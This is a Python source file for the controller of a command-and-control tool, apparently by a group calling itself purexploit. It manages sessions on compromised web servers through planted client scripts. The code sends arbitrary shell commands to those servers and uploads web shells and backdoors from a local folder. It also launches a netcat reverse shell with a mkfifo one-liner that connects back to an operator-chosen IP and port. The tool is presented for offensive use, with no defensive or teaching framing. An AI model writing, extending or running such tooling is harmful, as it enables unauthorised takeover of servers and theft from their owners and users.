import os, sys, platform, requests, base64, difflib, readline, time, threading
from .session import Sessions

GREEN = "\033[92m"
SILVER = "\033[37m"
BLUE = "\033[94m"
RED = "\033[1;31m"
YELLOW = "\033[93m"
RESET = "\033[0m" 
TOOL_NAME = "C2"
TOOL_VERSION = "1.1"
TOOL_AUTHOR = "kaitocoding"
GITHUB_RAW_URL = "https://raw.githubusercontent.com/kaitolegion/c2/main/assets/controller.py"

readline.set_history_length(100)

class Controller:

    # apply update
    def apply_update(self, remote_controller_code=None):
        """
        Update controller.py, session.py, and __init__.py if there are changes in the remote repository.
        """
        # Map of filenames to their raw GitHub URLs
        files_to_update = {
            "controller.py": "https://raw.githubusercontent.com/kaitolegion/c2/main/assets/controller.py",
            "session.py": "https://raw.githubusercontent.com/kaitolegion/c2/main/assets/session.py",
            "__init__.py": "https://raw.githubusercontent.com/kaitolegion/c2/main/assets/__init__.py",
        }

        updated = False

        for filename, url in files_to_update.items():
            local_path = os.path.join(os.path.dirname(__file__), filename)
            try:
                # Use already-fetched code for controller.py if provided
                if filename == "controller.py" and remote_controller_code is not None:
                    remote_code = remote_controller_code
                else:
                    resp = requests.get(url, timeout=5)
                    if resp.status_code != 200:
                        print(f"{YELLOW}[!]{RESET} Failed to fetch {filename} from remote (HTTP {resp.status_code})")
                        continue
                    remote_code = resp.text

                # Read local file
                if os.path.exists(local_path):
                    with open(local_path, "r", encoding="utf-8") as f:
                        local_code = f.read()
                else:
                    local_code = ""

                # Compare and update if different
                if local_code != remote_code:
                    print(f"{YELLOW}[!]{RESET} Updating {filename} ...")
                    # Optionally, show diff
                    diff = list(difflib.unified_diff(
                        local_code.splitlines(), remote_code.splitlines(),
                        fromfile=f"local/{filename}", tofile=f"remote/{filename}", lineterm=""
                    ))
                    if diff:
                        print("\n".join(diff))
                    with open(local_path, "w", encoding="utf-8") as f:
                        f.write(remote_code)
                    updated = True
                else:
                    print(f"{GREEN}[✓]{RESET} {filename} is up to date.")
            except Exception as e:
                print(f"{RED}[!]{RESET} Error updating {filename}: {e}")

        if updated:
            print(f"{GREEN}[+]{RESET} Update applied. Please restart the tool to use the new version.")
        else:
            print(f"{GREEN}[✓]{RESET} All files are already up to date.")
    # detect operating system and clear terminal
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    # --- REWRITE active_session with per-session loading spinner ---
    def active_session(self):
        sessions = Sessions()._load()
        print(f"{GREEN}[+] Sessions:{RESET}")
        if not sessions:
            print(f"{YELLOW}[!]{RESET} No active sessions found.")
            return

        session_list = []
        shown = set()
        for i, sid in enumerate(sessions.keys(), 1):
            if sid in shown:
                continue
            shown.add(sid)
            server = sessions[sid].get("server", "unknown")
            session_list.append((i, sid, server))

        spinner = ['|', '/', '-', '\\', '_']
        spinner_len = len(spinner)
        spinner_indices = [0] * len(session_list)
        statuses = [None] * len(session_list)
        threads = []

        # Function to check status for each session
        def check_status(idx, sid, server):
            try:
                r = requests.get(server, timeout=3)
                online = r.status_code == 200 and r.json().get("team") == "purexploit"
            except Exception:
                online = False
            statuses[idx] = f"{GREEN}ONLINE{RESET}" if online else f"{RED}OFFLINE{RESET}"

        # Start threads to check status
        for idx, (i, sid, server) in enumerate(session_list):
            t = threading.Thread(target=check_status, args=(idx, sid, server))
            t.start()
            threads.append(t)

        try:
            # Print spinner and status in-place, avoid duplicate output after all checked
            while not all(statuses):
                for idx, (i, sid, server) in enumerate(session_list):
                    spin = spinner[spinner_indices[idx] % spinner_len]
                    status = statuses[idx] if statuses[idx] else spin
                    # Compose the line
                    print(f"\r{BLUE}[{i}]{RESET} {sid} - {server} {status}{' ' * 10}", end='')
                    print()  # Move to next line for each session
                    spinner_indices[idx] += 1
                # Move cursor up to overwrite previous lines
                if len(session_list) > 0:
                    print(f"\033[{len(session_list)}A", end='')  # Move up N lines
                time.sleep(0.12)
            # After all statuses are checked, print the final statuses in-place (overwrite spinner lines)
            for idx, (i, sid, server) in enumerate(session_list):
                print(f"\r{BLUE}[{i}]{RESET} {sid} - {server} {statuses[idx]}{' ' * 10}", end='')
                print()
        finally:
            for t in threads:
                t.join()

    # check for available updates
    def check_updates(self):
        try:
            r = requests.get(GITHUB_RAW_URL, timeout=5)
            if r.status_code == 200:
                remote_code = r.text
                # Extract remote version string
                for line in remote_code.splitlines():
                    if "TOOL_VERSION" in line and "=" in line:
                        remote_version = line.split("=")[1].strip().strip('"\'')
                        break
                else:
                    print(f"{YELLOW}[!]{RESET} Could not find version info in remote file.")
                    return

                if remote_version != TOOL_VERSION:
                    print(f"{YELLOW}[!]{RESET} Update available: {GREEN}{remote_version}{RESET} (current: {TOOL_VERSION})")
                    choice = input(f"{BLUE}[?]{RESET} Do you want to update now? [Y/n]: ").strip().lower()
                    if choice in ["y", "yes", ""]:
                        self.apply_update(r.text)
                    else:
                        print(f"{YELLOW}[!]{RESET} Skipping update.")
            else:
                print(f"{YELLOW}[!]{RESET} Failed to check for updates (HTTP {r.status_code})")
        except Exception as e:
            print(f"{YELLOW}[!]{RESET} Update check failed: {e}")

    # banner1
    def banner(self):
        print(f"""{SILVER}

            
       ___  __  _____  _____  _____  __   ____  __________
      / _ \/ / / / _ \/ __/ |/_/ _ \/ /  / __ \/  _/_  __/
     / ___/ /_/ / , _/ _/_>  </ ___/ /__/ /_/ // /  / /   
    /_/   \____/_/|_/___/_/|_/_/  /____/\____/___/ /_/    
                                                      

        {RESET}{GREEN}{TOOL_NAME}{RESET} : version {YELLOW}{TOOL_VERSION}{RESET}
        Team: @purexploit.Team{RESET}

      """)

    def format_bytes(self, size):
        # 2**10 = 1024
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if isinstance(size, (int, float)) and size < 1024.0:
                return f"{size:.2f} {unit}"
            if not isinstance(size, (int, float)):
                return str(size)
            size /= 1024.0
        return f"{size:.2f} PB"

    def reg(self, new_server=None):
        while True:
            if new_server is None:
                new_server = input(f"{BLUE}Enter new target: {RESET}").strip()
            if new_server.lower() == "exit":
                print("closed")
                self.pogix_menu()
                return
            if not new_server:
                print(f"{YELLOW}[!]{RESET} URL cannot be empty. Please enter a valid URL (e.g., http://target/path/client.php)")
                new_server = None
                continue
            if not (new_server.startswith("http://") or new_server.startswith("https://")):
                print(f"{YELLOW}[!]{RESET} URL must start with http:// or https://")
                new_server = None
                continue

            try:
                r = requests.post(new_server, data={"action": "register"})
                r.raise_for_status()
                session = r.json()
                session["server"] = new_server
                sessions = Sessions()._load()
                sessions[session["id"]] = session
                Sessions()._save(sessions)
                print(f"{GREEN}[+]{RESET} Connected session: {BLUE}{session['id']}{RESET} - {session.get('server', 'unknown')}")
                print(f"{GREEN}[+]{RESET} Method: {session.get('method', 'unknown')}")
                print(f"{GREEN}[+]{RESET} CWD: {session.get('cwd', 'unknown')}")
                storage_bytes = session.get('storage', 'unknown')
                print(f"{GREEN}[+]{RESET} STORAGE: {self.format_bytes(storage_bytes)}")
                return session
            except requests.exceptions.MissingSchema:
                print(f"{YELLOW}[!]{RESET} Invalid URL. Please include the scheme (http:// or https://).")
            except requests.exceptions.ConnectionError:
                print(f"{YELLOW}[!]{RESET} Could not connect to {new_server}. Please check the URL and try again.")
            except requests.exceptions.HTTPError as e:
                print(f"{YELLOW}[!]{RESET} HTTP error: {e}")
            except Exception as e:
                print(f"{YELLOW}[!]{RESET} Error: {e}")
            # Prompt again if error
            new_server = None

    # upload shell or backdoor to target machine
    def upshell(self, session, shell_name):
        possible_paths = [
            os.path.join(os.getcwd(), "scripts", "bd", shell_name),
            os.path.join(os.getcwd(), shell_name)
        ]
        shell_path = None
        for path in possible_paths:
            if os.path.exists(path):
                shell_path = path
                break
        if not shell_path:
            print(f"{YELLOW}[!]{RESET} {shell_name} not found or current directory")
            return

        server = session.get("server")
        try:
            with open(shell_path, 'rb') as f:
                files = {'file': (shell_name, f)}
                data = {"action": "upload", "name": shell_name}
                r = requests.post(server, data=data, files=files)
                r.raise_for_status()
                try:
                    resp = r.json()
                except Exception:
                    print(f"{YELLOW}[!]{RESET} Server did not return valid JSON.")
                    return
                if resp.get("status") == "uploaded":
                    uploaded_file = resp.get('file')
                    print(f"{GREEN}[+]{RESET} Uploaded {shell_name} to server as {BLUE}{uploaded_file}{RESET}")
                else:
                    if resp.get("error"):
                        print(f"{YELLOW}[!]{RESET} Upload failed: {resp['error']}")
                    else:
                        print(f"{YELLOW}[!]{RESET} Upload failed: Unknown error")
        except requests.exceptions.RequestException as e:
            print(f"{YELLOW}[!]{RESET} Upload error: {e}")
        except Exception as e:
            print(f"{YELLOW}[!]{RESET} Unexpected error during upload: {e}")

    # send command to the target machine
    def send_cmd(self, session, cmd):
        server = session.get("server")
        # Use POST instead of GET
        r = requests.post(server, data={"action": "push", "id": session["id"], "cmd": cmd})
        return r.json()

    # get response to the target machine
    def response(self, session):
        server = session.get("server")
        # Use POST instead of GET
        r = requests.post(server, data={"action": "fetch_result", "id": session["id"]})
        res = r.json()
        out = res.get("output", "")
        try:
            decoded = base64.b64decode(out).decode(errors="ignore")
        except:
            decoded = out
        return decoded

    # menu and commands
    def pogix_menu(self):
        self.active_session()
        print(SILVER + "-" * 40 + RESET)
        print(f"{GREEN}[+] Commands:{RESET} (only when connected)")
        print(f"{SILVER}[*] spawn shell [name]{RESET} :   {SILVER}Upload your shell (e.g, spawn shell up.php){RESET}")
        print(f"{SILVER}[*] spawn list{RESET}         :   {SILVER}List of available backdoors{RESET}")
        print(f"{SILVER}[*] rev [ip] [port]{RESET}    :   {SILVER}Reverse Shell (netcat){RESET}")
        print(f"{SILVER}[*] clear{RESET}              :   {SILVER}Clear commands{RESET}")
        print(f"{SILVER}[*] exit/quit{RESET}          :   {SILVER}Back to home{RESET}")
        print(f"{GREEN}[+] Commands:{RESET} (not connected)")
        print(f"{SILVER}[*] n/new{RESET}              :   {SILVER}For new target{RESET}")
        print(f"{SILVER}[*] kill [num]{RESET}         :   {SILVER}Remove session number [num]{RESET}")
        print(f"{SILVER}[*] about{RESET}              :   {SILVER}About this tool{RESET}")
        print(f"{SILVER}[*] update{RESET}             :   {SILVER}Check for updates{RESET}")
        print(f"{SILVER}[*] clear{RESET}              :   {SILVER}Clear commands{RESET}")
        print(f"{SILVER}[*] CTRL+C{RESET}             :   {SILVER}Exit the program{RESET}")
        print(SILVER + "-" * 40 + RESET)

        
    # main run the program
    def run(self):
        self.clear_screen()
        self.banner()
        self.pogix_menu()
        # command for not connected session
        while True:
            try:
                choice = input(f"{GREEN}px@security{RED}~{BLUE}$ {RESET}").strip()
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!]{RESET} Exiting.")
                sys.exit(0)
            if choice.lower() in ["n", "new"]:
                session = self.reg()
                continue
            elif choice.lower() == "about":
                print(SILVER + "-" * 40 + RESET)
                print(f"{GREEN}C2 Command and Control v{TOOL_VERSION}{RESET}")
                print(f"{SILVER}Coded by {TOOL_AUTHOR}{RESET}")
                print(f"{YELLOW}Description:{RESET} {SILVER}Remote C2 Controller for registered agents{RESET}")
                print(f"{YELLOW}Platform:{RESET} {SILVER}{platform.system()} {platform.release()}{RESET}")
                print(SILVER + "-" * 40 + RESET)
                continue
            elif choice.lower() == "update":
                self.check_updates()
            elif choice.lower() == "clear":
                self.clear_screen()
                self.banner()
                self.pogix_menu()
            elif choice.lower().startswith("kill "):
                parts = choice.split()
                if len(parts) == 2 and parts[1].isdigit():
                    kill_num = int(parts[1])
                    sessions = Sessions()._load()
                    session_keys = list(sessions.keys())
                    if 1 <= kill_num <= len(session_keys):
                        sid_to_kill = session_keys[kill_num-1]
                        del sessions[sid_to_kill]
                        Sessions()._save(sessions)
                        # Refresh banner after kill
                        if sessions:
                            print(f"{YELLOW}[!]{RESET} Session {sid_to_kill} removed.")
                        else:
                            print(f"{YELLOW}[!]{RESET} No sessions left. Registering new session...")
                            session = self.reg()
                            break
                    else:
                        print(f"{YELLOW}[!]{RESET} Invalid session number for kill.")
                else:
                    print(f"{YELLOW}[!]{RESET} Usage: kill [num]")
                continue
            else:
                # Allow user to input the number of the session to select
                sessions = Sessions()._load()
                session_keys = list(sessions.keys())
                if choice.isdigit():
                    idx = int(choice)
                    if 1 <= idx <= len(session_keys):
                        session_id = session_keys[idx-1]
                        session = sessions[session_id]
                        print(f"{GREEN}[+]{RESET} session connected: {BLUE}{session_id}{RESET}")
                        # Enter connected session command loop (like c2.py)
                        while True:
                            try:
                                cmd = input(f"{GREEN}purexploit@security({RED}{session_id}{SILVER})$ {RESET}").strip()
                            except KeyboardInterrupt:
                                print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected. Exiting.")
                                break

                            # Special commands
                            if cmd.lower() in ["exit", "quit"]:
                                # On exit, reset session's cwd to home (if possible)
                                if 'home' in session:
                                    session['cwd'] = session['home']
                                    sessions[session_id] = session
                                    Sessions()._save(sessions)
                                print(f"{YELLOW}[!]{RESET} Returning to session selection/home.")
                                break
                            elif cmd.lower() == "clear":
                                self.clear_screen()
                                continue
                            elif cmd.lower().startswith("spawn shell"):
                                # Parse shell name if provided
                                parts = cmd.split()
                                if len(parts) == 3:
                                    shell_name = parts[2]
                                else:
                                    shell_name = "px.php"
                                # Try to upload shell (assume upload_shell exists)
                                try:
                                    self.upshell(session, shell_name)
                                except Exception as e:
                                    print(f"{YELLOW}[!]{RESET} Upload error: {e}")
                                continue
                            elif cmd.lower().startswith("spawn list"):
                                files_dir = "scripts/bd/"
                                try:
                                    files = os.listdir(files_dir)
                                    print(f"{GREEN}[+]{RESET} Available:")
                                    for f in files:
                                        print(f"  {SILVER}{f}{RESET}")
                                except Exception as e:
                                    print(f"{YELLOW}[!]{RESET} Could not list files in {files_dir}: {e}")
                                continue
                            # implement reverse shell
                            elif cmd.lower().startswith("rev"):
                                parts = cmd.strip().split()
                                if len(parts) == 3:
                                    ip = parts[1]
                                    port = parts[2]
                                    # First, check if netcat exists on the target
                                    check_nc_cmd = "which nc || command -v nc"
                                    try:
                                        self.send_cmd(session, check_nc_cmd)
                                        nc_path = self.response(session).strip()
                                        if not nc_path or "not found" in nc_path.lower():
                                            print(f"{YELLOW}[!]{RESET} Netcat (nc) not found on target. Cannot spawn reverse shell.")
                                            continue
                                        rev_cmd = (f"touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f")
                                        try:
                                            self.send_cmd(session, rev_cmd)
                                            response = self.response(session)
                                            print(f"{GREEN}{response}{RESET}")
                                        except KeyboardInterrupt:
                                            print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected during reverse shell. Aborting command.")
                                            continue
                                    except KeyboardInterrupt:
                                        print(f"\n{YELLOW}[!]{RESET} KeyboardInterrupt detected during netcat check. Aborting command.")
                                        continue
                                    except Exception as e:
                                        print(f"{YELLOW}[!]{RESET} Failed to send reverse shell: {e}")
                                else:
                                    print(f"{YELLOW}[!]{RESET} Usage: rev [ip] [port]")
                                continue
                            # Send to target
                            try:
                                self.send_cmd(session, cmd)
                                output = self.response(session)
                                print(f"{GREEN}{output}{RESET}")
                            except Exception as e:
                                print(f"{YELLOW}[!]{RESET} Error: {e}")
                    else:
                        print(f"{YELLOW}[!]{RESET} Invalid session number. Try again or use 'n' or 'kill [num]'.")
                else:
                    print(f"{YELLOW}[!]{RESET} Invalid choice. Try again or use 'n' or 'kill [num]'.")
